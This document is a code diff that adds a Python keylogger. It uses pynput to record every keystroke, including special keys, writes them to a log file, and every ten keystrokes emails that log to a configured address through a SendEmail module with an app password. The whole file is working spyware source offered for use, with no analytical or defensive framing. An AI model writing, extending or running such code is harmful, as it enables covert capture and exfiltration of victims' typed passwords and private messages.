@@ -1,0 +1,51 @@
+from pynput.keyboard import Key, Listener
+import SendEmail
+import os
+
+# Variables
+count = 0
+keys = []
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+log_file = os.path.join(BASE_DIR, "L_keys.txt")
+
+# Email configuration
+SENDER_EMAIL = "Email"
+RECEIVER_EMAIL = "Email"
+APP_PASSWORD = "App Password"
+
+def on_press(key):
+    global count, keys
+    keys.append(key)
+    count += 1
+    print(f"{key} pressed")
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+        SendEmail.send_email(log_file, SENDER_EMAIL, RECEIVER_EMAIL, APP_PASSWORD)
+
+def write_file(keys):
+    with open(log_file, "a") as file:
+        for key in keys:
+            if key == Key.space:
+                file.write(" ")
+            elif key == Key.enter:
+                file.write("\n")
+            elif key == Key.tab:
+                file.write("\t")
+            elif key == Key.backspace:
+                file.seek(file.tell() - 1, 0)
+                file.truncate()
+            elif hasattr(key, "char") and key.char is not None:
+                file.write(key.char)
+            else:
+                file.write(f"[{key.name.upper()}]")
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+# Start the Loop
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
